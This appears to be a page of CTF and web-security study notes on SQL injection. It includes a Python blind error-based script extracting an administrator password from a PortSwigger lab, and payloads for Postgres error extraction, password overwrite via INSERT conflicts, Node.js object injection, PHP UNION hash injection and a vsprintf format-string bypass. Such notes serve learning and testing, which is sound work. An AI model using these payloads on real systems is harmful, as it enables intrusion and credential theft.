# SQL Injection

## Advanced SQLI

* TODO
* <https://omakmoh.github.io/binarysearchinsqli/>
* <https://4bdoz.medium.com/exploit-sql-injection-and-bypass-captcha-with-sqlmap-81e6fa1d4cd8>

## Oracle DB

Using `From` clause is mandatory, you can use `From dual` database.

* Useful payloads

```
import requests
import string

chars = string.ascii_letters + string.digits
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://portswigger.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-User": "?1", "Dnt": "1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
burp0_url = "https://0aac000b037a4225806adf7a001000f8.web-security-academy.net:443/"

FLAG='1'
NUM = 2

while len(FLAG) <20:
    for CHAR in chars:
        PAYLOAD = f"'||(SELECT CASE WHEN SUBSTR(password,{NUM},1)='{CHAR}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        burp0_cookies = {"TrackingId": f"qnAqFiTow3TblhjF{PAYLOAD}", "session": "i65oU2hcqvITQo2rsNXGgidq7zK6MJlu"}
        resp = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        if resp.status_code == 500:
            NUM += 1
            FLAG += CHAR
            print("FLAG: ",FLAG)
            print("NUM: ", NUM)
        elif resp.status_code ==200:
            pass
```

## Postgres visible error

We can use this error to get data from db directly.

```
AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--;
```

![](https://pwnsec-notes.gitbook.io/ctf-notes/~gitbook/image?url=https%3A%2F%2F1504879363-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F40QKoxlr9Mj1ke1fMHsL%252Fuploads%252FFVY4cC26QnK2V69U4MzD%252Fimage.png%3Falt%3Dmedia%26token%3D39ca8c57-cc39-4f0a-930b-bb50cbb4e85f&width=768&dpr=4&quality=100&sign=bd506b9e&sv=2)

## Unicode

* <https://book.hacktricks.xyz/pentesting-web/unicode-injection/unicode-normalization#sql-injection-filter-bypass>

## Insert statement

Make sure to play with commenting as it errors out sometimes.

```
username=admin&password=1337') ON CONFLICT(username) DO UPDATE SET password = 'admin';--"

# Mysql (Password: bcrypt("admin"))
admin\",\"$2a$12$BHVtAvXDP1xgjkGEoeqRTu2y4mycnpd6If0j/WbP0PCjwW4CKdq6G\") ON DUPLICATE KEY UPDATE password =\"$2a$12$s7j4XlEOiqDjcqkEZqeU8e9je5K9ZhXQQh5YtaIpL8ZgfGHR.GqGe\"--
```

## Nodejs

Object injection

```
...
app.post("/auth", function (request, response) {
 var username = request.body.username;
 var password = request.body.password;
 if (username && password) {
  connection.query(
   "SELECT * FROM accounts WHERE username = ? AND password = ?",
   [username, password],
   function (error, results, fields) {
    ...
   }
  );
 }
});
```

This could be exploited by:

```
username=admin&password[password]=1
```

* Reference: <https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/>

## Password\_verify() [PHP]

This can be used to inject a fake row containing results with a password hash whose password is known to the attacker.

```
SELECT * FROM table WHERE Username = 'MEOW' UNION SELECT 'root' AS username, '$6$ErsDojKr$7wXeObXJSXeSRzCWFi0ANfqTPndUGlEp0y1NkhzVl5lWaLibhkEucBklU6j43/JeUPEtLlpRFsFcSOqtEfqRe0' AS pwhash'
```

## vsprintf [PHP]

Taking the following code as an example:

```
    public function getLoginUserData($username, $password){
        $username = strtr($username, ['"' => '\\"', '\\' => '\\\\']);
        $query = vsprintf("SELECT * FROM users WHERE `user_username` = \"$username\" AND `user_password` = :password", [$password]);
        $sql = $this->db->pdo->prepare($query);
        $sql->bindValue(':password', $password);
        //var_dump($sql);
        $sql->execute();
        $result = $sql->fetch(PDO::FETCH_OBJ);
        return $result;
    }
```

`strtr()` is doing a very good job here for preventing the sql injection by escaping double quotes and backslashes, and the `vsprintf()` in password could be exploited using the `%1$\"<INJECTION_POINT>` trick, but however the `$sql->bindValue(':password', $password);` is preventing it.

A trick to bypass this is to use `%s`format string as a placeholder to pass the payload to username through password:

```
username=%s&password=Administrator" OR 1=1-- -
```

